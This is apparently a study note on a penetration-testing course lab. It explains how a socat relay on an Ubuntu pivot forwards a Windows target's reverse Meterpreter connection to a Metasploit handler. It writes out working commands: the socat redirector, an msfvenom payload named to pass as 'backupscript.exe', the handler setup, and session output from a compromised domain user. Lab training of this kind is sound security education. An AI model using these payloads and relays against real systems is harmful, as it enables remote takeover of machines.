# 1. 🧠 What Is Socat?

**Socat** is a bidirectional relay tool.

Its basic purpose is to create a connection between **two independent network channels** and relay data between them.

In simple terms:

```text
Connection A
    │
    ▼
  SOCAT
    │
    ▼
Connection B
```

Unlike the previous SSH technique, Socat can perform this redirection **without using SSH tunneling**.

---

# 2. 🔀 Socat as a Redirector

Socat can:

- Listen on a host/port.
    
- Accept incoming connections.
    
- Forward the received traffic.
    
- Send that traffic to another IP/port.
    
- Relay data in both directions.
    

Conceptually:

```text
               SOCAT
                 │
        ┌────────┴────────┐
        │                 │
        ▼                 ▼
   Listen Side       Forward Side
   :8080             10.10.14.18:80
```

So Socat essentially acts as a **network traffic bridge/redirector**.

---

# 3. 🖼️ Overall Network Diagram

![Image](https://images.openai.com/static-rsc-4/s67bTEb6TpwY_x3RAEee321yBUe2Qm-dBcqQAGu96B0DwTfPXrysOQA1p-DIUwJi_49w8syG6K1e4kN6fzlD96Nzf0fTnu-zOYw2oMyyPYE4R9CMTtYvNqps46YGhffLuzGju0IRtpQpcpNSyBznjWZPhqSsY586PszukPtxNcwp2pCdKiXqHml8O2tktdIV?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/gdvXYUw847G8Z4sV6kc-ucxQ_j7yjucpbWinQBdh-naoAEs24_gGKnh_l_bmQZy5oDVxPDoGvqrtWDReJPxKpL44WIZJCpI0LeFTE4QNV2bGcaYs1RfPnjHP8YxbZdXZmXr9_L5Xgbg6rL8prnB3z2P1azD9e84KOtZrJd-fy7s2GPn4i6Boqmbhc8mmfBbG?purpose=fullsize)

The lab's conceptual flow is:

```text
                     WINDOWS TARGET
                           │
                           │ Reverse HTTPS
                           ▼
                   Ubuntu Pivot Server
                    172.16.5.129
                           │
                           │ Socat :8080
                           ▼
                     Attack Host
                    10.10.14.18
                         :80
                           │
                           ▼
                    Metasploit Handler
```

---

# 4. 🎯 Why Use Socat?

In the previous section, we used:

```text
SSH -R
```

to create a reverse port forward.

Now we want to accomplish a similar traffic-redirection concept using:

```text
SOCAT
```

The major difference is:

```text
SSH method
     ↓
SSH tunnel
```

versus:

```text
Socat method
     ↓
Direct TCP relay
```

---

# 5. 🔥 Core Concept

The desired connection is:

```text
Windows
    │
    │ Connects to
    ▼
Ubuntu:8080
    │
    │ Socat forwards
    ▼
Attack Host:80
    │
    ▼
Metasploit
```

The Windows target only needs to reach the Ubuntu server.

It doesn't need to directly reach the attack host.

---

# 6. 🛠️ Step 1 — Start Socat

The supplied command is:

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

This is the most important command in this section.

---

# 7. 🔍 Breaking Down the Socat Command

## `socat`

Starts the Socat relay.

---

## `TCP4-LISTEN:8080`

Socat creates a TCP IPv4 listener on:

```text
Port: 8080
```

The supplied text describes this as listening on the Ubuntu server.

---

## `fork`

This is important.

```text
fork
```

allows Socat to create a separate handling process for each incoming connection.

Conceptually:

```text
Connection 1 ──► Process 1
Connection 2 ──► Process 2
Connection 3 ──► Process 3
```

---

## `TCP4:10.10.14.18:80`

This defines the forwarding destination:

```text
10.10.14.18:80
```

which is the attack host's listener.

---

# 8. 🧠 The Entire Socat Command in One Sentence

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

means:

> **Listen for TCP connections on port 8080 and forward the traffic to 10.10.14.18 on port 80.**

---

# 9. 📊 Port Mapping

This is the key mapping:

```text
Ubuntu Pivot
172.16.5.129:8080
        │
        │ SOCAT
        ▼
Attack Host
10.10.14.18:80
```

Remember:

```text
8080 → Socat
80   → Metasploit
```

---

# 10. 🧩 Why the Payload Uses Port 8080

The Windows payload must connect to the **Ubuntu pivot**, because that is the host reachable by the Windows target.

Therefore:

```text
LHOST = 172.16.5.129
LPORT = 8080
```

The payload's connection becomes:

```text
Windows
   │
   ▼
172.16.5.129:8080
```

Socat then takes over.

---

# 11. 🔄 Complete Traffic Flow

```text
WINDOWS TARGET
      │
      │ Reverse HTTPS
      │
      ▼
Ubuntu Pivot
172.16.5.129:8080
      │
      │ Socat
      ▼
Attack Host
10.10.14.18:80
      │
      ▼
Metasploit Handler
```

This is the entire technique.

---

# 12. 🛠️ Step 2 — Create the Windows Payload

The supplied command is:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

The important configuration is:

```text
LHOST = 172.16.5.129
LPORT = 8080
```

---

# 13. 🔍 Payload Configuration

### Payload

```text
windows/x64/meterpreter/reverse_https
```

This creates a Windows x64 Meterpreter reverse HTTPS payload.

### LHOST

```text
172.16.5.129
```

The Ubuntu pivot.

### LPORT

```text
8080
```

The Socat listener.

### Output

```text
backupscript.exe
```

---

# 14. ⭐ Critical Relationship

The payload does **not** connect directly to:

```text
10.10.14.18:80
```

Instead:

```text
Windows
   ↓
172.16.5.129:8080
   ↓
SOCAT
   ↓
10.10.14.18:80
```

This is the same core pivoting principle as the previous SSH `-R` technique.

---

# 15. 📦 Step 3 — Transfer the Payload

The supplied material says to transfer:

```text
backupscript.exe
```

to the Windows target using techniques covered in previous sections.

The exact transfer method isn't specified in this section.

The important thing is:

```text
Windows Target
      │
      ▼
backupscript.exe
```

---

# 16. 🖥️ Step 4 — Start Metasploit

Start:

```bash
sudo msfconsole
```

Then configure:

```text
use exploit/multi/handler
```

---

# 17. ⚙️ Configure the Handler

The supplied configuration is:

```text
set payload windows/x64/meterpreter/reverse_https
```

Then:

```text
set lhost 0.0.0.0
```

and:

```text
set lport 80
```

Then:

```text
run
```

The handler reports:

```text
[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

---

# 18. 🧠 Why Metasploit Uses Port 80

Socat forwards traffic to:

```text
10.10.14.18:80
```

Therefore, the Metasploit handler must listen on:

```text
0.0.0.0:80
```

So:

```text
SOCAT destination
       │
       ▼
10.10.14.18:80
       │
       ▼
Metasploit :80
```

The ports must match.

---

# 19. 🧠 Complete Configuration Table

|Component|IP|Port|
|---|---|--:|
|Windows payload destination|`172.16.5.129`|`8080`|
|Socat listener|Ubuntu|`8080`|
|Socat forwarding destination|`10.10.14.18`|`80`|
|Metasploit listener|Attack Host|`80`|

### Memorize:

```text
Windows
   ↓
Ubuntu :8080
   ↓ Socat
Attack Host :80
   ↓
MSF
```

---

# 20. 🔄 SSH `-R` vs Socat

This is an important comparison with the previous lesson.

## SSH Remote Forwarding

```text
Windows
   ↓
Ubuntu:8080
   ↓
SSH -R
   ↓
Attack Host:8000
```

## Socat

```text
Windows
   ↓
Ubuntu:8080
   ↓
Socat
   ↓
Attack Host:80
```

### Main difference

```text
SSH -R
   ↓
Uses SSH forwarding

Socat
   ↓
Uses TCP relay/redirection
```

---

# 21. 🧠 Think of Socat as a Pipe

A very easy way to remember Socat:

```text
              SOCAT
                │
                │
      ┌─────────┴─────────┐
      │                   │
      ▼                   ▼
  Endpoint A          Endpoint B
 Ubuntu:8080       Attack:10.10.14.18:80
```

Traffic entering one endpoint is relayed to the other.

---

# 22. 🖼️ Socat vs SSH Diagram

```text
                SSH METHOD

Windows
   │
   ▼
Ubuntu:8080
   │
   │ SSH Tunnel
   ▼
Attack Host:8000
```

```text
               SOCAT METHOD

Windows
   │
   ▼
Ubuntu:8080
   │
   │ TCP Relay
   ▼
Attack Host:80
```

---

# 23. 📡 Establishing the Meterpreter Session

After the payload is executed, the attack host receives the connection.

The supplied output shows:

```text
[*] https://0.0.0.0:80 handling request from 10.129.202.64
```

This tells us that the Metasploit handler is receiving traffic.

Then:

```text
[*] Staging x64 payload
```

appears.

Finally:

```text
[*] Meterpreter session 1 opened
```

The supplied session is then used with:

```text
meterpreter > getuid
```

and returns:

```text
Server username: INLANEFREIGHT\victor
```

---

# 24. 🔍 Understanding the Session

The final result demonstrates:

```text
Windows Target
      │
      ▼
Ubuntu
      │
      ▼
Socat
      │
      ▼
Attack Host
      │
      ▼
Metasploit
      │
      ▼
Meterpreter
```

So the reverse connection successfully crossed the pivot.

---

# 25. 🧠 Why Does Socat Work Here?

Because the Windows host can communicate with:

```text
172.16.5.129
```

but doesn't have to communicate directly with:

```text
10.10.14.18
```

The Ubuntu server performs the redirection:

```text
Windows
   │
   │ Reachable
   ▼
Ubuntu
   │
   │ Relay
   ▼
Attack Host
```

---

# 26. 🔥 The Important Networking Lesson

When troubleshooting a pivot, don't just ask:

> "Can my payload connect back?"

Ask:

> **"Can my target reach the address and port configured as LHOST/LPORT?"**

Here:

```text
Windows → 172.16.5.129:8080
```

must work.

Then:

```text
Ubuntu → 10.10.14.18:80
```

must work.

Therefore the complete chain works.

---

# 27. 🧩 Socat Connection Logic

Think in two separate connections.

### Connection 1

```text
Windows
     ↓
Ubuntu:8080
```

### Connection 2

```text
Ubuntu
     ↓
Attack Host:80
```

Socat connects them:

```text
Connection 1
     │
     ▼
   SOCAT
     │
     ▼
Connection 2
```

---

# 28. 🛠️ Important Socat Syntax

General form:

```text
socat [LISTENER] [DESTINATION]
```

Here:

```text
TCP4-LISTEN:8080,fork
```

is the listener.

And:

```text
TCP4:10.10.14.18:80
```

is the destination.

Therefore:

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

---

# 29. 📌 Important Socat Options

|Option|Meaning|
|---|---|
|`TCP4`|Use IPv4 TCP|
|`LISTEN`|Create a listening socket|
|`8080`|Listening port|
|`fork`|Handle connections in separate processes|
|`TCP4:IP:PORT`|Forward to the specified TCP destination|

---

# 30. 🔥 What `fork` Does

Without going too deep into implementation:

```text
Incoming Connection
       │
       ▼
    Socat
       │
       ▼
Forward
```

With:

```text
fork
```

multiple incoming connections can be handled independently:

```text
Connection 1 ──► Process 1
Connection 2 ──► Process 2
Connection 3 ──► Process 3
```

This is useful for services where multiple connections may occur.

---

# 31. 🆚 Remote SSH Forward vs Socat

|Feature|SSH `-R`|Socat|
|---|---|---|
|Main purpose|Remote port forwarding|Generic network relay|
|Tunnel|SSH tunnel|Direct relay|
|Authentication|SSH authentication|Not inherently required|
|Encryption|SSH provides encryption|Socat itself isn't an SSH encryption layer|
|Listener|Remote side|Configurable|
|Forwarding|Remote → local/client side|Endpoint → endpoint|
|Complexity|Requires SSH access|Requires network reachability|

---

# 32. 🧠 Key Difference in Security

SSH:

```text
Traffic
   ↓
Encrypted SSH Tunnel
```

Socat:

```text
Traffic
   ↓
TCP Relay
```

So don't think of Socat as a replacement for SSH's encryption.

Socat is primarily a **relay/redirection mechanism**.

---

# 33. 📝 Viva Questions

### Q1. What is Socat?

A bidirectional relay tool that can connect two independent network channels and forward traffic between them.

### Q2. What is Socat being used for in this lab?

As a **redirector** between the Ubuntu pivot and the attack host.

### Q3. What port does Socat listen on?

```text
8080
```

### Q4. Where does Socat forward the traffic?

```text
10.10.14.18:80
```

### Q5. What is the Socat command?

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Q6. What does `fork` do?

It allows Socat to handle incoming connections using separate processes.

### Q7. What is the payload LHOST?

```text
172.16.5.129
```

### Q8. What is the payload LPORT?

```text
8080
```

### Q9. Where does Metasploit listen?

```text
0.0.0.0:80
```

### Q10. Why does the payload connect to Ubuntu instead of the attack host?

Because Ubuntu is the reachable pivot/redirector from the Windows target.

### Q11. What does Socat do with the incoming connection?

It forwards it to the attack host's listener.

### Q12. What is the final result?

A Meterpreter session is established through the Socat redirector.

---

# 34. ⚡ One-Minute Revision

```text
                     SOCAT
                       │
                       ▼
              Ubuntu Pivot
               :8080 LISTEN
                       │
                       │ Forward
                       ▼
              Attack Host
               :80 LISTEN
                       │
                       ▼
                 Metasploit
```

Payload:

```text
LHOST = 172.16.5.129
LPORT = 8080
```

Socat:

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Metasploit:

```text
LHOST = 0.0.0.0
LPORT = 80
```

Final flow:

```text
Windows
   ↓
Ubuntu:8080
   ↓
SOCAT
   ↓
10.10.14.18:80
   ↓
Metasploit
   ↓
Meterpreter
```

---

# 🏆 35. Ultimate Memory Trick

Remember **S-O-C-A-T** as:

```text
S → Server/pivot listens
O → One connection enters
C → Connection is relayed
A → Attack host receives it
T → Traffic continues through the relay
```

And the single most important concept:

> **Socat doesn't magically create a route. It creates a relay between two endpoints that the Ubuntu pivot can reach.**

So when you see:

```text
Target → Pivot → Attack Host
```

and you need a simple TCP redirection without an SSH forwarding tunnel:

```text
SOCAT
```

is the key technique to remember.